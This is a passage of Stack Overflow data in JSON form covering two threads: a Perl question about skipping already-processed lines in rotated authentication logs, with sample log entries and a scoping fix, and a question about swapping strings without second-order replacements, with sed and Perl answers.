"display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1533139287, "post_id": 51637545, "comment_id": 90239773, "body": "@Borodin: As I understand it, he&#39;s trying to avoid processing bits of the logfiles multiple times, so he&#39;s holding a counter recording the highest record number that was seen previously and skipping to that record on the next run. I think I&#39;ve fixed his immediate problem, but there are higher level architectural problems here that I don&#39;t have time for."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 1, "creation_date": 1533144852, "post_id": 51637545, "comment_id": 90242724, "body": "@Dave: Ah I see, I think. Thank you very much. This sounds like a case for <code>seek</code>: just <code>seek</code> to the length of the file when it was last processed."}, {"owner": {"reputation": 229, "user_id": 1195443, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/2eb518cdd36536d35b63cfb9d29f9af3?s=128&d=identicon&r=PG", "display_name": "clarkseth", "link": "https://stackoverflow.com/users/1195443/clarkseth"}, "edited": false, "score": 0, "creation_date": 1533222127, "post_id": 51637545, "comment_id": 90277132, "body": "@DaveCross Do you have any idea, about why if i remove record separator ($/ = &quot;\\n\\n&quot;; ) my script doesn&#39;t work (it does not encapsulate the contents of lines anymore)"}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "reply_to_user": {"reputation": 229, "user_id": 1195443, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/2eb518cdd36536d35b63cfb9d29f9af3?s=128&d=identicon&r=PG", "display_name": "clarkseth", "link": "https://stackoverflow.com/users/1195443/clarkseth"}, "edited": false, "score": 0, "creation_date": 1533222499, "post_id": 51637545, "comment_id": 90277405, "body": "@clarkseth: That sounds like it should be a separate question, to be honest."}, {"owner": {"reputation": 229, "user_id": 1195443, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/2eb518cdd36536d35b63cfb9d29f9af3?s=128&d=identicon&r=PG", "display_name": "clarkseth", "link": "https://stackoverflow.com/users/1195443/clarkseth"}, "edited": false, "score": 0, "creation_date": 1533223876, "post_id": 51637545, "comment_id": 90278390, "body": "@DaveCross ...my problem was ever been the separator :( (with jumprow).     Your sugestion have made more smart my jumprow stack.     I&#39;ve work to my script, for perfectionate it, and i&#39;ve ever update the code until now. That&#39;s all ...            If you desire to semplificate my problem into a short question, i can delete this Q and create another one... Tell me what i have to do, you&#39;re the only user that give me an help until now on this question."}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "reply_to_user": {"reputation": 229, "user_id": 1195443, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/2eb518cdd36536d35b63cfb9d29f9af3?s=128&d=identicon&r=PG", "display_name": "clarkseth", "link": "https://stackoverflow.com/users/1195443/clarkseth"}, "edited": false, "score": 1, "creation_date": 1533225130, "post_id": 51637545, "comment_id": 90279170, "body": "@clarkseth: Please don&#39;t consider deleting this question. Stack Overflow works best if questions and answers are left for other users to find. I can&#39;t simplify your problem into a new question for you, as I don&#39;t really understand it myself. You&#39;ll have to do that."}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "reply_to_user": {"reputation": 229, "user_id": 1195443, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/2eb518cdd36536d35b63cfb9d29f9af3?s=128&d=identicon&r=PG", "display_name": "clarkseth", "link": "https://stackoverflow.com/users/1195443/clarkseth"}, "edited": false, "score": 0, "creation_date": 1533225207, "post_id": 51637545, "comment_id": 90279221, "body": "@clarkseth: It&#39;s also worth pointing out that the very act of sitting down and trying to work out exactly what you want to ask, is often a good way to discover that you already know the answer :-)"}, {"owner": {"reputation": 229, "user_id": 1195443, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/2eb518cdd36536d35b63cfb9d29f9af3?s=128&d=identicon&r=PG", "display_name": "clarkseth", "link": "https://stackoverflow.com/users/1195443/clarkseth"}, "edited": false, "score": 0, "creation_date": 1533225273, "post_id": 51637545, "comment_id": 90279258, "body": "@DaveCross Ah Ok, I did not understand that you didn&#39;t understand. I provide a new question. Thank you"}, {"owner": {"reputation": 229, "user_id": 1195443, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/2eb518cdd36536d35b63cfb9d29f9af3?s=128&d=identicon&r=PG", "display_name": "clarkseth", "link": "https://stackoverflow.com/users/1195443/clarkseth"}, "edited": false, "score": 0, "creation_date": 1533225357, "post_id": 51637545, "comment_id": 90279299, "body": "@DaveCross ahahah yeah, usually after a good question, we find a correct answer alone :)"}, {"owner": {"reputation": 229, "user_id": 1195443, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/2eb518cdd36536d35b63cfb9d29f9af3?s=128&d=identicon&r=PG", "display_name": "clarkseth", "link": "https://stackoverflow.com/users/1195443/clarkseth"}, "edited": false, "score": 0, "creation_date": 1533287491, "post_id": 51637545, "comment_id": 90300922, "body": "@DaveCross I have insert new question :)  as you suggested      <a href=\"https://stackoverflow.com/questions/51669156/perl-encapsulate-data-from-file-with-regex-exprex-doesnt-work-without\" title=\"perl encapsulate data from file with regex exprex doesnt work without\">stackoverflow.com/questions/51669156/&hellip;</a>"}], "tags": [], "owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "is_accepted": false, "score": 2, "last_activity_date": 1533138641, "creation_date": 1533138641, "answer_id": 51637545, "question_id": 51636352, "link": "https://stackoverflow.com/questions/51636352/perl-how-to-skip-the-lines-already-read-in-a-previous-processing/51637545#51637545", "title": "Perl - how to skip the lines already read in a previous processing", "body": "<p>I thought we covered this yesterday.</p>\n\n<pre><code>if ( $currentinode == $inode ) {\n    # Get rows to jump for this $INPUT\n    my $jumprow = $older_count{$INPUT}[0];\n}\nelse {\n    # If file has been changed\n    my $jumprow = 0;\n}\n</code></pre>\n\n<p>Each of these blocks declares a <strong>new</strong> <code>$jumprow</code> variable. And each of those variables ceases to exist when you exit the block that they were declared in (i.e. on the very next line).</p>\n\n<p>If you want to access these variables outside of the <code>if</code>/<code>else</code> blocks, then you need to declare them at a higher level.</p>\n\n<pre><code>my $jumprow;\nif ( $currentinode == $inode ) {\n    # Get rows to jump for this $INPUT\n    $jumprow = $older_count{$INPUT}[0];\n}\nelse {\n    # If file has been changed\n    $jumprow = 0;\n}\n</code></pre>\n\n<p>Or (more simply):</p>\n\n<pre><code>my $jumprow = 0;\n$jumprow = $older_count{$INPUT}[0] if $currentinode == $inode;\n</code></pre>\n\n<p>Or</p>\n\n<pre><code>my $jumprow = $currentinode == $inode ? $older_count{$INPUT}[0] : 0;\n</code></pre>\n"}], "owner": {"reputation": 229, "user_id": 1195443, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/2eb518cdd36536d35b63cfb9d29f9af3?s=128&d=identicon&r=PG", "display_name": "clarkseth", "link": "https://stackoverflow.com/users/1195443/clarkseth"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 106, "favorite_count": 0, "answer_count": 1, "score": 2, "last_activity_date": 1533220276, "creation_date": 1533135013, "last_edit_date": 1533220276, "question_id": 51636352, "link": "https://stackoverflow.com/questions/51636352/perl-how-to-skip-the-lines-already-read-in-a-previous-processing", "title": "Perl - how to skip the lines already read in a previous processing", "body": "\n\n<p>I have a problem with following Perl program, which can be used to reorganize perform the trace of accesses to an application.</p>\n\n<p>I've implemented following solution with jump rows function, because next in the future I could have 10 or more rotated files, of 50MB each.</p>\n\n<p>I Want to skip the lines already read in previous processing (if the inode of the file has not changed), in this way I will work only with deltas.</p>\n\n<p>I hope this code can help other users.</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>#!/usr/bin/perl\n\nuse strict;\nuse warnings 'all';\n\nuse File::Path qw&lt;mkpath&gt;;\nuse File::Spec;\nuse File::Copy;\nuse POSIX qw&lt;strftime&gt;;\nuse English;\n\n# Dynamic Variables\nmy %older_count;\nmy %older_inode;\nmy @newer_filelist;\nmy @events;\n\nmy $OLD_IN_FILE = \"\";\n\n# Static Variables\n# Directories\nmy $IN_DIR               = \"/tmp/appo/log\";    # Input Directories\nmy $OUTPUT_LOG_DIRECTORY = \"/tmp/appo/A14\";    # Output directory\n\n# Files\nmy $SPLITTED_OUTFILE = \"parse_log.csv\";           # Splitted by month output file\nmy $R_STATS          = \".rotation_statistics\";    # Rotation Statistic file\n\n## MAIN\n\n# Loading old statistics\nif (-e $R_STATS) { \n   open (STAT_FILE, $R_STATS) or die $!;\n\n    while ( &lt;STAT_FILE&gt; ) {\n       my @lines = split /\\n/;\n       my ( $file, $inode, $nrows ) = $lines[0] =~ /\\A(.\\w.*);(\\d.*);(\\d.*)/;    # Encapsulate values\n\n       push @{ $older_count{$file} }, $nrows;\n       push @{ $older_inode{$file} }, $inode;\n   }\n\n   close( STAT_FILE );\n}\n\n# Loading new events from log\nforeach my $INPUT ( glob( \"$IN_DIR/logrotate_*.log\" ) ) {\n\n    my $inode        = ( stat( $INPUT ) )[1];\n    my $currentinode = $older_inode{$INPUT}[0];\n\n    my $jumprow = 0;\n    $jumprow = $older_count{$INPUT}[0] if $currentinode == $inode; \n\n# Get current file stastistics\n   if ( $INPUT ne $OLD_IN_FILE ) {\n       my $count = ( split /\\s+/, `wc -l $INPUT` )[0];\n       push @newer_filelist, {\n             filename =&gt; $INPUT,\n             inode    =&gt; $inode,\n             count    =&gt; $count\n       };\n    }\n\n    # Log opening\n    open my $fh, '&lt;', $INPUT or die \"can't read open '$INPUT': $OS_ERROR\";\n\n    $/ = \"\\n\\n\";    # record separator\n\n    while ( &lt;$fh&gt; ) {\n\n        # next unless $. &gt; $jumprow; # This instruction doesn't work\n\n        # Log processing\n        my @lines = split /\\n/;\n        my $i     = 0;\n\n        foreach my $lines ( @lines ) {\n\n            # Take only Authentication rows and skip others\n            if ( $lines[$i] =~ m/\\A#\\d.\\d.+#\\d{4}\\s\\d{2}\\s\\d{2}\\s\\d{2}:\\d{2}:\\d{2}:\\d{3}#\\+\\d+#\\w+#\\/\\w+\\/\\w+\\/Authentication/ ) {\n\n                # Shows only LOGIN/LOGOUT access type and exclude GUEST users\n                if ( $lines[ $i + 2 ] =~ m/Login/ || $lines[ $i + 2 ] =~ m/Logout/ &amp;&amp; $lines[ $i + 3 ] !~ m/Guest/ ) {\n\n                    my ( $y, $m, $d, $time ) = $lines[$i] =~ /\\A#\\d.\\d.+#(\\d{4})\\s(\\d{2})\\s(\\d{2})\\s(\\d{2}:\\d{2}:\\d{2}:\\d{3})/;\n\n                    my ( $action ) = $lines[ $i + 2 ] =~ /(\\w+)/;\n                    my ( $user )   = $lines[ $i + 3 ] =~ /\\w+:\\s(.+)/;\n\n                    push @events, {\n                        date   =&gt; \"$y/$m/$d\",\n                        time   =&gt; $time,\n                        action =&gt; $action,\n                        user   =&gt; $user\n                    };  # Array loader\n                }\n            }\n            else {\n                next;\n            }\n\n            $i++;\n        }\n\n        $OLD_IN_FILE = $INPUT;\n    }\n    close( $fh );\n}\n\n# Print Log statistics for futher elaborations\nopen( STAT_FILE, '&gt;', $R_STATS ) or die $!;\n\nforeach my $my_filelist ( @newer_filelist ) {\n    print STAT_FILE join ';', $my_filelist-&gt;{filename}, $my_filelist-&gt;{inode}, \"$my_filelist-&gt;{count}\\n\";\n}\n\nclose( STAT_FILE );\n\nmy @by_user = sort { $a-&gt;{user} cmp $b-&gt;{user} } @events;    # Sorting by users\n\nforeach my $my_list ( @by_user ) {\n\n    my ( $y, $m ) = $my_list-&gt;{date} =~ /(\\d{4})\\/(\\d{2})/;\n\n    # Generate Directory YYYY-Month - #2009-January\n    my $directory = File::Spec-&gt;catfile( $OUTPUT_LOG_DIRECTORY, \"$m-$y\" );\n\n    unless ( -e $directory ) {\n        mkpath( $directory, { verbose =&gt; 1 } );\n    }\n\n    my $log_file_path = File::Spec-&gt;catfile( $directory, $SPLITTED_OUTFILE );\n\n    open( OUTPUT, '&gt;&gt;', $log_file_path ) or die $!;\n    print OUTPUT join ';', $my_list-&gt;{date}, $my_list-&gt;{time}, $my_list-&gt;{action}, \"$my_list-&gt;{user}\\n\";\n}\n\nclose( OUTPUT );\n</code></pre>\n\n<p>My log files are</p>\n\n<h3>logrotate_1.0.log</h3>\n\n<pre class=\"lang-none prettyprint-override\"><code>#2.0^H#2018 05 29 10:09:45:969#+0200#Info#/Sys/Sec/Authentication#\n#BC-JAS-SEC#security#C0000A7103EC9E50000000004#common.com/irj#com.common.services.security.authentication.logincontext.table#USER1#5##C47731E44D00000bae##0#Thread[HTTP Worker [@1473726842],5,Dedicated_Application_Thread]#Plain##\nLogin\nUser: USER4\nIP Address: 127.0.0.1\nAuthentication Stack: ticket\nAuthentication Stack Properties:\n\n#2.0^H#2018 05 29 11:51:06:541#+0200#Info#/Sy/Sec/Authentication#\n#BC-JAS-SEC#security#C0000A7103EC9F50000000004#common.com/irj#com.common.services.security.authentication.logincontext.table#USER4#6##A40B81404D03c0bae##0#Thread[HTTP Worker [@1264376989],5,Dedicated_Application_Thread]#Plain##\nLogin\nUser: USER1\nIP Address: 127.0.0.1\nAuthentication Stack: ticket\nAuthentication Stack Properties:\n\n#2.0^H#2018 05 30 11:54:03:906#+0200#Info#/Sy/Sec/Informtion#\n#BC-JAS-SEC#security#C0000A7103EC9F50000000004#common.com/irj#com.common.services.security.authentication.logincontext.table#USER4#6##A40B81404D03c0bae##0#Thread[HTTP Worker [@1264376989],5,Dedicated_Application_Thread]#Plain##\nLogin\nUser: USER4\nIP Address: 127.0.0.1\nAuthentication Stack: ticket\nAuthentication Stack Properties:\n\n#2.0^H#2018 05 30 11:59:59:156#+0200#Info#/Sys/Sec/Authentication#\n#BC-JAS-SEC#security#C0000A7103ECA0C#3935150000000004#common.com/irj#com.common.services.security.authentication.logincontext.table#USER3#7##9ACF7Ec0bae##0#Thread[HTTP Worker [@124054179],5,Dedicated_Application_Thread]#Plain##\nLogout\nUser: USER3\nIP Address: 127.0.0.1\nAuthentication Stack: ticket\nAuthentication Stack Properties:\n\n#2.0^H#2018 05 30 08:32:11:348#+0200#Warn#/Sys/Sec/Authentication#\n#BC-JAS-SEC#security#C0000A7103ECA20E0000508C#3935150000000004#common.com/irj#com.common.services.security.authentication.logincontext.table#USER2#03c0bae##0#Thread[HTTP Worker [@2033389552],5,Dedicated_Application_Thread]#Plain##\nLogin\nUser: USER4\nIP Address: 127.0.0.1\nAuthentication Stack: ticket\nAuthentication Stack Properties:\n\n#2.0^H#2018 05 30 11:09:54:978#+0200#Info#/Sys/Sec/Information#\n#BC-JAS-SEC#security#C0000A7103ECA20E0000508C#3935150000000004#common.com/irj#com.common.services.security.authentication.logincontext.table#USER2#03c0bae##0#Thread[HTTP Worker [@2033389552],5,Dedicated_Application_Thread]#Plain##\nLogin\nUser: USER2\nIP Address: 127.0.0.1\nAuthentication Stack: ticket\nAuthentication Stack Properties:\n\n#2.0^H#2018 06 01 08:11:30:008#+0200#Warn#/Sys/Sec/Authentication#\n#BC-JAS-SEC#security#C0000A7103ECA20050000508C#3935150000000004#common.com/irj#com.common.services.security.authentication.logincontext.table#USER2#0##E0E##0#Thread[HTTP Worker [@2033389552],5,Dedicated_Application_Thread]#Plain##\nLogout\nUser: USER2\nIP Address: 127.0.0.1\nAuthentication Stack: ticket\nAuthentication Stack Properties:\n\n#2.0^H#2018 06 01 11:11:29:658#+0200#Info#/Sys/Sec/Information#\n#BC-JAS-SEC#security#C0000A7103ECA20050000508C#3935150000000004#common.com/irj#com.common.services.security.authentication.logincontext.table#USER2#0##E0E##0#Thread[HTTP Worker [@2033389552],5,Dedicated_Application_Thread]#Plain##\nLogout\nUser: USER1\nIP Address: 127.0.0.1\nAuthentication Stack: ticket\nAuthentication Stack Properties:\n\n#2.0^H#2018 06 02 12:00:00:254#+0200#Info#/Sys/Sec/Authentication#\n#BC-JAS-SEC#security#C0000A7103ECA20050000508C#3935150000000004#common.com/irj#com.common.services.security.authentication.logincontext.table#USER2#0##E0E##0#Thread[HTTP Worker [@2033389552],5,Dedicated_Application_Thread]#Plain##\nLogout\nUser: Guest\nIP Address: 127.0.0.1\nAuthentication Stack: ticket\nAuthentication Stack Properties:\n\n#2.0^H#2018 06 02 12:05:00:465#+0200#Warn#/Sys/Sec/Authentication#\n#BC-JAS-SEC#security#C0000A7103ECA20050000508C#3935150000000004#common.com/irj#com.common.services.security.authentication.logincontext.table#USER2#0##E0E##0#Thread[HTTP Worker [@2033389552],5,Dedicated_Application_Thread]#Plain##\nLogout\nUser: USER9\nIP Address: 127.0.0.1\nAuthentication Stack: ticket\nAuthentication Stack Properties:\n\n#2.0^H#2018 06 02 12:50:00:065#+0200#Warn#/Sys/Sec/Authentication#\n#BC-JAS-SEC#security#C0000A7103ECA20050000508C#3935150000000004#common.com/irj#com.common.services.security.authentication.logincontext.table#USER2#0##E0E##0#Thread[HTTP Worker [@2033389552],5,Dedicated_Application_Thread]#Plain##\nLogin\nUser: USER9\nIP Address: 127.0.0.1\nAuthentication Stack: ticket\nAuthentication Stack Properties:\n\n#2.0^H#2018 05 24 10:43:38:683#+0200#Info#/Sys/Sec/Authentication#\n#BC-JAS-SEC#security#C0000A7103EC9E50000000004#common.com/irj#com.common.services.security.authentication.logincontext.table#USER1#5##C47731E44D00000bae##0#Thread[HTTP Worker [@1473726842],5,Dedicated_Application_Thread]#Plain##\nLogin\nUser: USER1\nIP Address: 127.0.0.1\nAuthentication Stack: ticket\nAuthentication Stack Properties:\n</code></pre>\n\n<h3>logrotate_0.0.log</h3>\n\n<pre class=\"lang-none prettyprint-override\"><code>#2.0^H#2018 05 24 11:05:04:011#+0200#Info#/Sy/Sec/Authentication#\n#BC-JAS-SEC#security#C0000A7103EC9F50000000004#common.com/irj#com.common.services.security.authentication.logincontext.table#USER4#6##A40B81404D03c0bae##0#Thread[HTTP Worker [@1264376989],5,Dedicated_Application_Thread]#Plain##\nLogin\nUser: USER4\nIP Address: 127.0.0.1\nAuthentication Stack: ticket\nAuthentication Stack Properties:\n\n#2.0^H#2018 05 24 11:04:59:410#+0200#Info#/Sy/Sec/Informtion#\n#BC-JAS-SEC#security#C0000A7103EC9F50000000004#common.com/irj#com.common.services.security.authentication.logincontext.table#USER4#6##A40B81404D03c0bae##0#Thread[HTTP Worker [@1264376989],5,Dedicated_Application_Thread]#Plain##\nLogin\nUser: USER4\nIP Address: 127.0.0.1\nAuthentication Stack: ticket\nAuthentication Stack Properties:\n\n#2.0^H#2018 05 24 11:05:07:100#+0200#Info#/Sys/Sec/Authentication#\n#BC-JAS-SEC#security#C0000A7103ECA0C#3935150000000004#common.com/irj#com.common.services.security.authentication.logincontext.table#USER3#7##9ACF7Ec0bae##0#Thread[HTTP Worker [@124054179],5,Dedicated_Application_Thread]#Plain##\nLogout\nUser: USER3\nIP Address: 127.0.0.1\nAuthentication Stack: ticket\nAuthentication Stack Properties:\n\n#2.0^H#2018 05 24 11:07:21:314#+0200#Warn#/Sys/Sec/Authentication#\n#BC-JAS-SEC#security#C0000A7103ECA20E0000508C#3935150000000004#common.com/irj#com.common.services.security.authentication.logincontext.table#USER2#03c0bae##0#Thread[HTTP Worker [@2033389552],5,Dedicated_Application_Thread]#Plain##\nLogin\nUser: USER2\nIP Address: 127.0.0.1\nAuthentication Stack: ticket\nAuthentication Stack Properties:\n\n#2.0^H#2018 05 24 11:07:21:314#+0200#Info#/Sys/Sec/Information#\n#BC-JAS-SEC#security#C0000A7103ECA20E0000508C#3935150000000004#common.com/irj#com.common.services.security.authentication.logincontext.table#USER2#03c0bae##0#Thread[HTTP Worker [@2033389552],5,Dedicated_Application_Thread]#Plain##\nLogin\nUser: USER2\nIP Address: 127.0.0.1\nAuthentication Stack: ticket\nAuthentication Stack Properties:\n\n#2.0^H#2018 05 26 10:48:02:458#+0200#Warn#/Sys/Sec/Authentication#\n#BC-JAS-SEC#security#C0000A7103ECA20050000508C#3935150000000004#common.com/irj#com.common.services.security.authentication.logincontext.table#USER2#0##E0E##0#Thread[HTTP Worker [@2033389552],5,Dedicated_Application_Thread]#Plain##\nLogout\nUser: USER2\nIP Address: 127.0.0.1\nAuthentication Stack: ticket\nAuthentication Stack Properties:\n\n#2.0^H#2018 05 28 10:00:25:000#+0200#Info#/Sys/Sec/Information#\n#BC-JAS-SEC#security#C0000A7103ECA20050000508C#3935150000000004#common.com/irj#com.common.services.security.authentication.logincontext.table#USER2#0##E0E##0#Thread[HTTP Worker [@2033389552],5,Dedicated_Application_Thread]#Plain##\nLogout\nUser: USER0\nIP Address: 127.0.0.1\nAuthentication Stack: ticket\nAuthentication Stack Properties:\n</code></pre>\n\n<p>I have a problem using the statementat line 54:</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>#next unless $. &gt; $jumprow;\n</code></pre>\n\n<p>I think it doesn't work because I use following record separator, but I don't understand what kind of separator I have to use for solve this problem:</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>$/ = \"\\n\\n\";  # record separator\n</code></pre>\n\n<p>For debug the code i've insert following statement: </p>\n\n<blockquote>\n  <p>print \"next unless $. > $jumprow\\n\";</p>\n</blockquote>\n\n<p>As i can see, $. value is not the same of row number of file (The cause is record separator with double new line ---> $/ = \"\\n\\n\";)</p>\n\n<p>If i remove my double new line, script doesn't work</p>\n\n<p>Details of my script:\n(1)First Step:\nRead STAT_FILE for see rows readed in last run</p>\n\n<p>(2)Second Step:\nI encapsulate Date, Time, Action( login or logout) and User (if isn't Guest) into an array (@events).\nI Sort array by user (not by date as default).</p>\n\n<p>(3)Third Step:\nI print into STAT_FILE information about my logfile readed</p>\n\n<p>(4)Fourth Step:\nI Write sorted @event array into a file parse_log.csv in a directory named MM-YYYY (it depends from date of my event).</p>\n\n<p>Could you help me to get a solution for my script please?</p>\n"}, {"tags": ["perl", "awk", "sed"], "comments": [{"owner": {"reputation": 23, "user_id": 10165154, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c15e439ed00559f43c41946d821e053b?s=128&d=identicon&r=PG&f=1", "display_name": "panconchoclo", "link": "https://stackoverflow.com/users/10165154/panconchoclo"}, "edited": false, "score": 0, "creation_date": 1533125376, "post_id": 51632695, "comment_id": 90229928, "body": "Thanks for edit by wrong format. The expected values for ID1 are these ones because originally ID1 had X1, X2 and X3, which are mapped by X2 X3, X7, and X8 respectively on the hash."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1533125746, "post_id": 51632695, "comment_id": 90230176, "body": "I&#39;m not clear what you want your input for the replacement to look like. Your <code>paste</code> command implies that you have two files <code>col1</code> and <code>col2</code>; is that what you want?"}, {"owner": {"reputation": 23, "user_id": 10165154, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c15e439ed00559f43c41946d821e053b?s=128&d=identicon&r=PG&f=1", "display_name": "panconchoclo", "link": "https://stackoverflow.com/users/10165154/panconchoclo"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1533126072, "post_id": 51632695, "comment_id": 90230394, "body": "@Borodin Yes I have 2 files; col1 has the &quot;keys&quot; to replace on the input file and col2 has the &quot;values&quot; or the new text to add. Originally both are in one file and I split that to run the bash command on this way."}, {"owner": {"reputation": 155597, "user_id": 1745001, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/99a3ebae89496eb16afe453aae97f5be?s=128&d=identicon&r=PG", "display_name": "Ed Morton", "link": "https://stackoverflow.com/users/1745001/ed-morton"}, "edited": false, "score": 0, "creation_date": 1533142993, "post_id": 51632695, "comment_id": 90241843, "body": "I see you&#39;re getting answers using regexps. Hopefully it&#39;s glaringly obvious that if you&#39;re trying to map <b>a literal string</b> to <b>another literal string</b> then doing so by employing regexps and then quoting and/or escaping characters and/or adding boundaries and/or doing anything similar with the regexp or replacement to try to make them behave like literal strings is the wrong approach compared to simply using literal strings."}], "answers": [{"comments": [{"owner": {"reputation": 23, "user_id": 10165154, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c15e439ed00559f43c41946d821e053b?s=128&d=identicon&r=PG&f=1", "display_name": "panconchoclo", "link": "https://stackoverflow.com/users/10165154/panconchoclo"}, "edited": false, "score": 0, "creation_date": 1533125865, "post_id": 51632838, "comment_id": 90230261, "body": "I thought the same but actually this sed line is doing all at once. So there is not a first and second round of replacements using sed in this way."}, {"owner": {"reputation": 155597, "user_id": 1745001, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/99a3ebae89496eb16afe453aae97f5be?s=128&d=identicon&r=PG", "display_name": "Ed Morton", "link": "https://stackoverflow.com/users/1745001/ed-morton"}, "edited": false, "score": 0, "creation_date": 1533149042, "post_id": 51632838, "comment_id": 90244968, "body": "The idiomatic way to do that would be to create a placeholder string that cannot exist in the input (<code>@Y</code> in the following), map A to that then map B to A then map that placeholder string to A and then restore the original mapping that made it possible to create the placeholder, e.g. to do that with sed would be the following: <code>sed &#39;s&#47;@&#47;@X&#47;g; s&#47;A&#47;@Y&#47;g; s&#47;B&#47;A&#47;g; s&#47;@Y&#47;A&#47;g; s&#47;@X&#47;@&#47;g&#39;</code>. That&#39;s very much overkill for this question of course."}], "tags": [], "owner": {"reputation": 205167, "user_id": 4323, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/qqgFU.png?s=128&g=1", "display_name": "John Zwinck", "link": "https://stackoverflow.com/users/4323/john-zwinck"}, "is_accepted": false, "score": 0, "last_activity_date": 1533124992, "creation_date": 1533124992, "answer_id": 51632838, "question_id": 51632695, "link": "https://stackoverflow.com/questions/51632695/how-to-replace-strings-avoiding-making-second-order-replacements/51632838#51632838", "title": "How to replace strings avoiding making second order replacements?", "body": "<p>In the first replacement, add some \"guard\" characters around the string, or otherwise make it unique.  Then make your second replacement pattern ignore such guarded tokens, and finally remove the guards.</p>\n\n<p>For example if you want to replace \"A\" with \"B\" and \"B\" with \"A\", you can replace \"A\" with \"_A_\", \"B\" with \"A\", then \"_A_\" with \"B\".</p>\n"}, {"comments": [{"owner": {"reputation": 2833, "user_id": 9300627, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c7a38cf029222bcf1d902e6b2759ffeb?s=128&d=identicon&r=PG", "display_name": "haukex", "link": "https://stackoverflow.com/users/9300627/haukex"}, "edited": false, "score": 1, "creation_date": 1533127736, "post_id": 51633230, "comment_id": 90231595, "body": "I think it&#39;d be safer to sort <code>keys %repl</code> on their length, and, assuming the OP wants literal matches, to use <code>quotemeta</code>, i.e. <code>my ($re) = map {qr&#47;$_&#47;} join &#39;|&#39;, map {quotemeta} sort {length $b&lt;=&gt;length $a} keys %repl;</code>. See <a href=\"https://www.perlmonks.org/?node_id=1179840\" rel=\"nofollow noreferrer\">Building Regex Alternations Dynamically</a>."}, {"owner": {"reputation": 23, "user_id": 10165154, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c15e439ed00559f43c41946d821e053b?s=128&d=identicon&r=PG&f=1", "display_name": "panconchoclo", "link": "https://stackoverflow.com/users/10165154/panconchoclo"}, "edited": false, "score": 0, "creation_date": 1533127753, "post_id": 51633230, "comment_id": 90231605, "body": "@Borodin Awesome!!! I never was able to do that with Perl by my own. Thank you very much for your help this works really great and it&#39;s exactly what I was asking."}, {"owner": {"reputation": 2833, "user_id": 9300627, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c7a38cf029222bcf1d902e6b2759ffeb?s=128&d=identicon&r=PG", "display_name": "haukex", "link": "https://stackoverflow.com/users/9300627/haukex"}, "reply_to_user": {"reputation": 23, "user_id": 10165154, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c15e439ed00559f43c41946d821e053b?s=128&d=identicon&r=PG&f=1", "display_name": "panconchoclo", "link": "https://stackoverflow.com/users/10165154/panconchoclo"}, "edited": false, "score": 1, "creation_date": 1533128740, "post_id": 51633230, "comment_id": 90232312, "body": "@panconchoclo If your input data is not as simple as you&#39;ve shown in the question, specifically if your search keys from <code>repl.txt</code> have non-word characters and differing lengths, then this code, as currently shown, may randomly not work correctly. See the code and link I provided in the comment above."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": 